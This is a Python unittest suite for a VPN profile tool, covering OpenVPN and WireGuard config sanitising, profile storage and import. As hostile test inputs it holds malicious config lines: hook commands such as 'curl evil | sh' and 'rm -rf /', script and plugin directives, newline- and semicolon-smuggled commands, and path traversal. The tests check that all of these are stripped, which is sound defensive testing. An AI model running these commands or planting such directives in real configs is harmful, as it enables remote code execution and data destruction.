from __future__ import annotations

import base64
import os
import stat
import time
import unittest

from helpers import TmpRootCase

from ipshift.errors import NotFound, ProfileError
from ipshift.vpn import ovpn, wgconf
from ipshift.vpn.importer import detect_protocol, guess_country, import_profile, read_bundle
from ipshift.vpn.profile import Profile, ProfileStore, make_id, slugify

CERT = "-----BEGIN CERTIFICATE-----\nMIIBkTCB+wIJAK\nAAAAAAAAAAA=\n-----END CERTIFICATE-----"
KEY = "-----BEGIN PRIVATE KEY-----\nMIGHAgEAMBMGByqGSM49\n-----END PRIVATE KEY-----"
STATIC = "-----BEGIN OpenVPN Static key V1-----\n" + "\n".join(["0123456789abcdef" * 2] * 4) + "\n-----END OpenVPN Static key V1-----"


def wgkey() -> str:
    return base64.b64encode(os.urandom(32)).decode()


class OvpnTests(unittest.TestCase):
    BASE = f"client\ndev tun\nproto udp\nremote vpn.example.net 1194\nremote-cert-tls server\ncipher AES-256-GCM\n<ca>\n{CERT}\n</ca>\n"

    def test_minimal_config(self):
        r = ovpn.sanitize(self.BASE)
        self.assertEqual([(e.host, e.port, e.proto) for e in r.endpoints], [("vpn.example.net", 1194, "udp")])
        self.assertIn("remote-cert-tls server", r.body)
        self.assertIn("<ca>", r.body)
        self.assertNotIn("remote vpn", r.body)            # remotes are re-rendered at connect time
        self.assertNotIn("dev tun", r.body)               # device is ours
        self.assertEqual(r.removed, [])

    def test_code_execution_directives_are_stripped(self):
        evil = self.BASE + "\n".join([
            "up /tmp/pwn.sh", "down /tmp/pwn.sh", "route-up /tmp/pwn.sh", "plugin /tmp/pwn.so",
            "tls-verify /tmp/pwn.sh", "auth-user-pass-verify /tmp/pwn.sh via-env", "script-security 3",
            "client-connect /tmp/pwn.sh", "learn-address /tmp/pwn.sh", "ipchange /tmp/pwn.sh",
            "management 0.0.0.0 7505", "log /etc/passwd", "writepid /etc/cron.d/x", "chroot /",
            "config /etc/shadow", "user root", "daemon", "setenv FOO bar", "engine dynamic",
        ]) + "\n"
        r = ovpn.sanitize(evil)
        for bad in ("up", "down", "route-up", "plugin", "tls-verify", "auth-user-pass-verify", "script-security",
                    "client-connect", "learn-address", "ipchange", "management", "log", "writepid", "chroot",
                    "config", "user", "daemon", "engine"):
            self.assertIn(bad, r.removed, bad)
            for line in r.body.splitlines():
                self.assertNotEqual(line.split(" ")[0], bad, f"{bad} survived: {line}")
        self.assertNotIn("/tmp/pwn", r.body)
        self.assertNotIn("/etc/", r.body)

    def test_unknown_directives_are_dropped_not_trusted(self):
        r = ovpn.sanitize(self.BASE + "made-up-option 1\nverb 11\n")
        self.assertIn("ignored unsupported directive 'made-up-option'", r.warnings)
        self.assertNotIn("made-up", r.body)

    def test_argument_charset_blocks_injection(self):
        r = ovpn.sanitize(self.BASE + 'cipher "AES-256-GCM\\nup /bin/sh"\ntls-cipher "A B"\nreneg-sec 10; up x\n')
        self.assertNotIn("/bin/sh", r.body)
        self.assertEqual([l for l in r.body.splitlines() if l.startswith(("cipher", "tls-cipher", "reneg"))],
                         ["cipher AES-256-GCM"])

    def test_options_that_switch_encryption_off_are_ignored(self):
        for line in ("cipher none", "cipher NONE", "auth none", "data-ciphers AES-256-GCM:none",
                     "data-ciphers-fallback none", "ncp-ciphers none:AES-128-GCM"):
            name = line.split()[0]
            r = ovpn.sanitize(self.BASE + line + "\n")
            self.assertIn(f"ignored '{name}': it would switch off encryption or authentication", r.warnings, line)
            self.assertEqual([l for l in r.body.splitlines() if l.lower().startswith(name + " ") and "none" in l.lower()], [], line)
        r = ovpn.sanitize(self.BASE + "auth SHA256\ndata-ciphers AES-256-GCM:AES-128-GCM\n")      # real values still pass
        self.assertIn("auth SHA256", r.body)
        self.assertIn("data-ciphers AES-256-GCM:AES-128-GCM", r.body)

    def test_push_peer_info_is_removed(self):
        r = ovpn.sanitize(self.BASE + "push-peer-info\n")
        self.assertNotIn("push-peer-info", r.body)
        self.assertTrue(any("push-peer-info" in w for w in r.warnings), r.warnings)

    def test_files_are_inlined_and_paths_never_survive(self):
        cfg = "client\nremote 203.0.113.5 443 tcp\nca ca.crt\ncert /home/u/client.crt\nkey C:\\vpn\\client.key\n" \
              "tls-auth ta.key 1\nauth-user-pass creds.txt\n"
        files = {"ca.crt": CERT, "client.crt": "Certificate:\n  Data: junk\n" + CERT, "client.key": KEY,
                 "ta.key": "# comment\n" + STATIC, "creds.txt": "alice\ns3cret\n"}
        r = ovpn.sanitize(cfg, files)
        for tag in ("ca", "cert", "key", "tls-auth"):
            self.assertIn(f"<{tag}>", r.body)
        self.assertIn("key-direction 1", r.body)
        self.assertNotIn("ca.crt", r.body)
        self.assertNotIn("/home/u", r.body)
        self.assertEqual((r.needs_auth, r.auth), (True, ("alice", "s3cret")))
        self.assertEqual(r.endpoints[0].proto, "tcp")
        self.assertEqual(ovpn.referenced_files(cfg), ["ca.crt", "client.crt", "client.key", "ta.key", "creds.txt"])

    def test_missing_files_are_reported(self):
        with self.assertRaises(ProfileError) as cm:
            ovpn.sanitize("client\nremote 1.2.3.4\nca ca.crt\n", {})
        self.assertIn("ca.crt", str(cm.exception))

    def test_non_pem_content_is_rejected_not_stored(self):
        with self.assertRaises(ProfileError):
            ovpn.sanitize("client\nremote 1.2.3.4\nca ca.crt\n", {"ca.crt": "root:x:0:0:root:/root:/bin/bash\n"})

    def test_encrypted_key_rejected(self):
        enc = "-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFH\n-----END ENCRYPTED PRIVATE KEY-----"
        with self.assertRaises(ProfileError):
            ovpn.sanitize(self.BASE + f"<key>\n{enc}\n</key>\n")

    def test_connection_blocks_and_global_port(self):
        cfg = "client\nport 443\nproto tcp\nremote a.example.net\n" \
              "<connection>\nremote b.example.net\nproto udp\nport 1195\n</connection>\n" \
              "<connection>\nproto udp\nremote c.example.net 53 udp\nhttp-proxy 1.2.3.4 80\n</connection>\n"
        r = ovpn.sanitize(cfg)
        got = [(e.host, e.port, e.proto) for e in r.endpoints]
        self.assertEqual(got, [("a.example.net", 443, "tcp"), ("b.example.net", 1195, "udp"), ("c.example.net", 53, "udp")])

    def test_keepalive_and_dns(self):
        r = ovpn.sanitize(self.BASE + "keepalive 10 60\ndhcp-option DNS 10.8.0.1\ndhcp-option DNS evil.example\ndhcp-option DOMAIN x\n")
        self.assertEqual(r.dns, ["10.8.0.1"])
        self.assertNotIn("keepalive", r.body)

    def test_validation_errors(self):
        for text in ("client\n", "client\nremote bad_host!name 1194\n", "client\nremote a.b 99999\n",
                     "client\nremote a.b 1194 sctp\n", "client\nproto tcp-server\nremote a.b\n",
                     "client\nremote a.b\n<ca>\n", "x\0y", "client\nremote a.b\n" + "#" * (ovpn.MAX_BYTES + 1)):
            with self.assertRaises(ProfileError, msg=text[:30]):
                ovpn.sanitize(text)

    def test_render_forces_our_device_routing_and_server(self):
        body = ovpn.sanitize(self.BASE).body
        out = ovpn.render(body, ip="203.0.113.9", port=1194, proto="udp", iface="ipshift0",
                          user="nobody", group="nogroup", auth_path="/run/ipshift/runtime/x.auth")
        for needle in ("dev ipshift0", "dev-type tun", "remote 203.0.113.9 1194 udp", "redirect-gateway def1",
                       "script-security 1", "connect-retry-max 1", "ping-exit 30", "user nobody",
                       "auth-user-pass /run/ipshift/runtime/x.auth", "disable-dco"):
            self.assertIn(needle, out)
        v6 = ovpn.render(body, ip="2001:db8::1", port=443, proto="tcp", iface="ipshift0")
        self.assertIn("remote 2001:db8::1 443 tcp6-client", v6)
        self.assertNotIn("user ", v6)


class WireGuardTests(unittest.TestCase):
    def conf(self, extra_iface="", extra_peer="", allowed="0.0.0.0/0, ::/0"):
        self.priv, self.pub, self.psk = wgkey(), wgkey(), wgkey()
        return f"""[Interface]
PrivateKey = {self.priv}
Address = 10.2.0.2/32, fd00::2/128
DNS = 10.2.0.1, example.search
MTU = 1380
{extra_iface}
[Peer]
PublicKey = {self.pub}
PresharedKey = {self.psk}
AllowedIPs = {allowed}
Endpoint = vpn.example.net:51820  # comment
{extra_peer}
"""

    def test_parse_roundtrip(self):
        cfg = wgconf.parse(self.conf())
        self.assertEqual(cfg.addresses, ["10.2.0.2/32", "fd00::2/128"])
        self.assertEqual((cfg.dns, cfg.mtu), (["10.2.0.1"], 1380))
        self.assertTrue(cfg.full_tunnel and cfg.has_ipv6)
        self.assertEqual([(e.host, e.port) for e in cfg.endpoints()], [("vpn.example.net", 51820)])
        again = wgconf.parse(wgconf.render_canonical(cfg))
        self.assertEqual(again.peers[0].allowed_ips, cfg.peers[0].allowed_ips)
        self.assertTrue(any("non-IP DNS" in w for w in cfg.warnings))

    def test_hooks_are_removed(self):
        cfg = wgconf.parse(self.conf(extra_iface="PostUp = curl evil | sh\nPreDown = rm -rf /\nSaveConfig = true\nListenPort = 5\nTable = off"))
        self.assertEqual(sorted(cfg.removed), ["postup", "predown", "saveconfig"])
        canon = wgconf.render_canonical(cfg)
        for bad in ("PostUp", "evil", "rm -rf", "ListenPort", "Table"):
            self.assertNotIn(bad, canon)

    def test_setconf_is_minimal_and_resolved(self):
        cfg = wgconf.parse(self.conf())
        out = wgconf.render_setconf(cfg, {0: ("203.0.113.7", 51820)})
        self.assertIn("Endpoint = 203.0.113.7:51820", out)
        self.assertIn("PersistentKeepalive = 25", out)             # forced: immediate handshake + NAT keepalive
        for bad in ("Address", "DNS", "MTU", "vpn.example.net"):
            self.assertNotIn(bad, out)
        v6 = wgconf.render_setconf(cfg, {0: ("2001:db8::9", 443)}, keepalive=0)
        self.assertIn("Endpoint = [2001:db8::9]:443", v6)
        self.assertNotIn("PersistentKeepalive", v6)

    def test_validation(self):
        good = self.conf()
        bad_cases = [
            good.replace(self.priv, "notakey"), good.replace("10.2.0.2/32, fd00::2/128", "nope"),
            good.replace("0.0.0.0/0, ::/0", "garbage"), good.replace("vpn.example.net:51820", "vpn.example.net"),
            good.replace("vpn.example.net:51820", "bad host:51820"), good.replace(self.psk, "x"),
            "[Interface]\nPrivateKey = " + self.priv + "\nAddress = 10.0.0.2/32\n", "[Weird]\nA = b\n", "no section = here",
            good + "\n[Peer]\nPublicKey = " + self.pub + "\nAllowedIPs = 10.0.0.0/8\nPersistentKeepalive = soon\n",
        ]
        for text in bad_cases:
            with self.assertRaises(ProfileError, msg=text[:60]):
                wgconf.parse(text)
        self.assertFalse(wgconf.valid_key(base64.b64encode(b"short").decode()))

    def test_split_tunnel_detected(self):
        self.assertFalse(wgconf.parse(self.conf(allowed="10.0.0.0/8")).full_tunnel)

    def test_endpoint_forms(self):
        self.assertEqual(wgconf.parse_endpoint("[2001:db8::1]:51820"), ("2001:db8::1", 51820))
        self.assertEqual(wgconf.parse_endpoint("203.0.113.5:1"), ("203.0.113.5", 1))


class ProfileStoreTests(TmpRootCase):
    def make_store(self):
        return ProfileStore(self.tmp / "profiles")

    def prof(self, name="nl-ams-1", **kw):
        return Profile(id=make_id(name, name), name=name, protocol="openvpn", **kw)

    def test_modes_and_roundtrip(self):
        s = self.make_store()
        p = s.add(self.prof(tier="paid"), "cfg-body", ("bob", "pw"))
        self.assertEqual(stat.S_IMODE(os.stat(s.dir).st_mode), 0o700)
        for ext in ("json", "cfg", "auth"):
            self.assertEqual(stat.S_IMODE(os.stat(s.dir / f"{p.id}.{ext}").st_mode), 0o600)
        again = ProfileStore(s.dir)
        self.assertEqual(again.get(p.id).tier, "paid")
        self.assertEqual(again.read_auth(again.get(p.id)), ("bob", "pw"))
        self.assertEqual(again.read_config(p), "cfg-body")
        self.assertTrue(again.get(p.id).has_auth)

    def test_lookup_rules(self):
        s = self.make_store()
        a = s.add(self.prof("Alpha"), "1")
        s.add(self.prof("alpha-two"), "2")
        self.assertEqual(s.get("alpha").id, a.id)                  # exact (case-insensitive) name wins
        self.assertEqual(s.get(a.id).id, a.id)
        with self.assertRaises(NotFound):
            s.get("nothing")
        with self.assertRaises(ProfileError):
            s.get("alpha-")                                        # ambiguous prefix
        with self.assertRaises(ProfileError):
            s.add(self.prof("Alpha"), "1")                         # duplicate
        s.add(self.prof("Alpha"), "1", replace=True)

    def test_filters_and_update(self):
        s = self.make_store()
        s.add(self.prof("a", tier="free", country="NL"), "1")
        s.add(self.prof("b", tier="paid", country="DE"), "2")
        s.add(self.prof("c", tier="self-hosted"), "3")
        self.assertEqual({p.name for p in s.list(tiers=["free", "paid"])}, {"a", "b"})
        self.assertEqual([p.name for p in s.list(country="de")], ["b"])
        s.update("c", enabled=False, country="se")
        self.assertEqual(s.list(enabled=True).__len__(), 2)
        self.assertEqual(s.get("c").country, "SE")
        with self.assertRaises(ProfileError):
            s.update("c", tier="gold")
        with self.assertRaises(ProfileError):
            s.update("c", country="Sweden")
        with self.assertRaises(ProfileError):
            s.update("c", id="x")

    def test_quarantine_and_recovery(self):
        s = self.make_store()
        p = s.add(self.prof("flaky"), "x")
        for _ in range(2):
            s.record_result(p.id, False, error="timeout")
        self.assertTrue(s.get(p.id).usable)
        s.record_result(p.id, False, error="timeout")
        self.assertTrue(s.get(p.id).quarantined)
        self.assertFalse(s.get(p.id).usable)
        self.assertGreater(s.get(p.id).quarantined_until, time.time())
        s.record_result(p.id, True, 800, "203.0.113.4")
        got = s.get(p.id)
        self.assertEqual((got.consecutive_failures, got.quarantined, got.last_ip, got.avg_ms), (0, False, "203.0.113.4", 800))
        s.record_result(p.id, True, 400, "203.0.113.5")
        self.assertEqual(s.get(p.id).avg_ms, 680)                  # smoothed, not replaced
        s.record_result(p.id, False)
        s.record_result(p.id, False)
        s.record_result(p.id, False)
        self.assertEqual(s.clear_quarantine(), 1)
        self.assertTrue(s.get(p.id).usable)

    def test_needs_auth_blocks_use_until_credentials_exist(self):
        s = self.make_store()
        p = s.add(self.prof("needs", needs_auth=True), "x")
        self.assertFalse(s.get(p.id).usable)
        s.set_auth(p.id, "u", "p")
        self.assertTrue(s.get(p.id).usable)
        with self.assertRaises(ProfileError):
            s.set_auth(p.id, "u\nroot", "p")

    def test_remove_deletes_all_files_and_ids_are_safe(self):
        s = self.make_store()
        p = s.add(self.prof("gone"), "x", ("u", "p"))
        s.remove(p.id)
        self.assertEqual(list(s.dir.iterdir()), [])
        with self.assertRaises(ProfileError):
            s._path("../../etc/passwd", "cfg")

    def test_corrupt_entry_is_skipped(self):
        s = self.make_store()
        s.add(self.prof("ok"), "x")
        (s.dir / "broken.json").write_text("{not json")
        self.assertEqual(len(ProfileStore(s.dir).list()), 1)

    def test_slug_and_id(self):
        self.assertEqual(slugify("Proton VPN / NL#12"), "proton-vpn-nl-12")
        self.assertEqual(slugify("!!!"), "profile")
        self.assertNotEqual(make_id("a", "x"), make_id("a", "y"))


class ImporterTests(TmpRootCase):
    def test_detect_and_country(self):
        self.assertEqual(detect_protocol("[Interface]\nPrivateKey=x"), "wireguard")
        self.assertEqual(detect_protocol("client\nremote a.b 1194"), "openvpn")
        with self.assertRaises(ProfileError):
            detect_protocol("hello world")
        self.assertEqual(guess_country("us-nyc-001"), "US")
        self.assertEqual(guess_country("ProtonVPN_nl-free-3"), "NL")
        self.assertEqual(guess_country("uk-london"), "GB")
        self.assertEqual(guess_country("my-home-server"), "")
        self.assertEqual(guess_country("homelab"), "")

    def test_read_bundle_only_reads_next_to_the_config(self):
        d = self.tmp / "cfgs"
        d.mkdir()
        outside = self.tmp / "secret.txt"
        outside.write_text("-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----")
        (d / "ca.crt").write_text(CERT)
        (d / "a.ovpn").write_text(f"client\nremote 203.0.113.1 1194\nca ca.crt\ncert {outside}\nkey ../secret.txt\n")
        b = read_bundle(d / "a.ovpn")
        self.assertEqual(b["name"], "a")
        self.assertEqual(list(b["files"]), ["ca.crt"])             # absolute and ../ references were not followed

    def test_import_openvpn_resolves_names_and_guesses_country(self):
        class R:
            def resolve(self, host):
                if host == "down.example":
                    raise OSError("no answer")
                return ["203.0.113.50", "203.0.113.51"]

        store = ProfileStore(self.tmp / "profiles")
        text = f"client\nremote vpn.example.net 1194\nremote 198.51.100.7 443 tcp\nremote down.example 1194\nauth-user-pass\n<ca>\n{CERT}\n</ca>\nup x.sh\n"
        res = import_profile(store, text=text, name="nl-ams-1", tier="paid", provider="Acme", resolver=R())
        p = res.profile
        self.assertEqual((p.protocol, p.tier, p.country, p.provider, p.needs_auth, p.usable), ("openvpn", "paid", "NL", "Acme", True, False))
        self.assertEqual(p.endpoints[0].ips, ["203.0.113.50", "203.0.113.51"])
        self.assertEqual(p.endpoints[1].ips, ["198.51.100.7"])
        self.assertEqual(p.endpoints[2].ips, [])
        self.assertIn("up", res.removed)
        self.assertTrue(any("could not resolve down.example" in w for w in res.warnings))
        self.assertTrue(any("username and password" in w for w in res.warnings))
        store.set_auth(p.id, "u", "p")
        self.assertTrue(store.get(p.id).usable)

    def test_import_wireguard_and_validation(self):
        store = ProfileStore(self.tmp / "profiles")
        text = f"[Interface]\nPrivateKey = {wgkey()}\nAddress = 10.0.0.2/32\n[Peer]\nPublicKey = {wgkey()}\nAllowedIPs = 10.0.0.0/8\nEndpoint = 192.0.2.10:51820\n"
        res = import_profile(store, text=text, name="home-wg", tier="self-hosted")
        self.assertEqual(res.profile.protocol, "wireguard")
        self.assertTrue(any("AllowedIPs does not include 0.0.0.0/0" in w for w in res.warnings))
        self.assertEqual(res.profile.endpoints[0].ips, ["192.0.2.10"])
        for kw in ({"name": ""}, {"name": "x", "tier": "gold"}, {"name": "x", "country": "Narnia"}):
            with self.assertRaises(ProfileError):
                import_profile(store, text=text, **kw)
        with self.assertRaises(ProfileError):
            import_profile(store, text=text, name="home-wg")        # same config twice
        self.assertEqual(store.get(res.profile.id).tier, "self-hosted")

    def test_imported_files_hold_no_unsafe_content(self):
        store = ProfileStore(self.tmp / "profiles")
        text = f"client\nremote 203.0.113.2 1194\nplugin /tmp/x.so\n<ca>\n{CERT}\n</ca>\n"
        p = import_profile(store, text=text, name="safe").profile
        self.assertNotIn("plugin", store.read_config(p))


if __name__ == "__main__":
    unittest.main()
